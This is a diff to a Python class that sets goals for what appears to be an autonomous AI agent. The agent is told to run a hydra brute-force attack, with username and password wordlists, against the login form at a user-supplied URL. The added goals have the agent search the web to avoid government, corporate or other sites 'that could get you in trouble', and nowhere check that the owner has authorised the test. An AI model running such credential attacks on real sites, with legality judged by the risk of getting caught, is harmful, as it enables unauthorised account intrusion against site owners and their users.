@@ -109,10 +109,13 @@ class LoginChecker:
 
         self.goals = [
             # f"Stay on task with your goals and don't get into a loop. If you are looping, break the loop and re-exam your goals that you have left",
-            f"Check if {self.http_url} is a valid url to a login form before moving to step 2. If not, finish and reply to user \"Not a valid form URL. Please provide a actual form URL\""
+            f"Check {self.http_url} if it is a government or corporate website by searching the web. If it is, stop all tasks and finish with reply \"Not legal to run prompt check on {self.http_url}. Its a government or corporate website!!\"",
+            f"Do a search on cyber security laws and understand what is legal or not to hack",
+            f"Do a search on what {self.http_url} is about. Avoid any government, large coporation, social media and other websites that could get you in trouble. If it is found to get you in trouble, stop all tasks and finish with a reply to the user \"Not legal to run prompt check on {self.http_url}!!\".",
+            f"Check if {self.http_url} is a valid url to a login form and if not, stop all tasks and finish with a reply to user \"Not a valid form URL. Please provide a actual form URL\"",
             # f"Check if log files {self.info_log_path} and {self.error_log_path} exist and if not, create them",
             f"""
-            Run the command below. Don't try to install hydra. If hydra command failed, move on to step 2. Do not use sudo.
+            Run the command below. Don't try to install hydra. If hydra command failed, move on to step 2. Do not use sudo. Be very careful about running this.
             ```bash 
             hydra -v -L {data_path + "/username_list_small.txt"} -P {data_path + "/password_list_small.txt"} {hydra_host} http-post-form "/admin/login/:username=^USER^&password=^PASS^:F=Invalid username or password" > {self.info_log_path} 2> {self.error_log_path}
             ```
